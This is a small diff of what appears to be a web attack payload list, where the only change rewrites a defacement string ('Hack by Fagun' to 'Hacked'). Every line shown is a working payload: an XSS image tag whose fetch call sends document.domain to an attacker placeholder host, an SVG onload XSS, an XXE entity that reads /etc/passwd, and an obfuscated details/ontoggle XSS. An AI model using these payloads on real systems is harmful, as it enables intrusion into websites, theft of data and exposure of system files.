@@ -2,4 +2,4 @@
 <img src=x onerror=fetch('http://{yourip}/'+document.domain);>
 <svg/onload=prompt(document.domain);>
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>
--->""/>Hack by Fagun</script><deTailS open x=">" ontoggle=(co\u006efirm)``>
+-->""/>Hacked</script><deTailS open x=">" ontoggle=(co\u006efirm)``>
